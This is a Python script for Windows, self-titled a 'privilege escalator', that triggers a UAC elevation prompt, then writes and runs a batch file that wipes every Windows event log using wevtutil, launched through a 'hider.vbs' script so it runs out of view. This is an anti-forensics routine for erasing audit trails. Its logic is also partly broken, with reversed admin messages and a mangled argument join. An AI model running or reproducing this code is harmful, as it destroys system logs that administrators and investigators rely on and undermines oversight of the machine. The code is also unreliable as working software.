#I want to create a python script that allows me to request for adminstrator priviledge 

#Useful libraries that I would be working with -->
import os
import sys
import ctypes
import traceback

stat = ctypes.windll.shell32.IsUserAnAdmin()
print(stat)


#Declaring the various variables
class Escalate:
    def __init__(self):
        pass

    #This function checks if the program has admin priviledges
    def admin_stat(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    #This function gives the program admin priviledges
    def set_admin(self):
        try:
            if self.admin_stat():
                print("Non administrator")
            else:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0]), None, 1) #This requests for uac prompt
                print("Administrator")
        except:
            print("An error occurred")
        return

    #This function clears event logs
    def clear_event(self):
        try:
            batch_file = "clear_event.cmd"
            vbs_file = f"{os.getcwd()}\\hider.vbs"
            with open(batch_file, "w") as cmd:
                cmd.write(f'''@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
echo.
:theEnd''')
            with open(vbs_file, "r") as vbs:
                vbs.read()
            if self.admin_stat():
                # Code of your program here
                #os.chdir("C:\\Users\\Favour\\OneDrive\\Desktop\\")
                print(os.getcwd())
                os.system(f"start {vbs_file} {batch_file}")
                print("not root")
            else:
                # Re-run the program with admin rights
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                #os.chdir("C:\\Users\\Favour\\OneDrive\\Desktop\\")
                print(os.getcwd())
                #os.system(f" start .\clear_event.cmd")
                os.system(f"start {vbs_file} {batch_file}")
                print("root")
        except:
            traceback.print_exc()
            print("testing")


if __name__ == "__main__":
    print("PRIVILEDGE ESCALATOR \n")

    priv = Escalate().clear_event()

    print("\nExecuted successfully")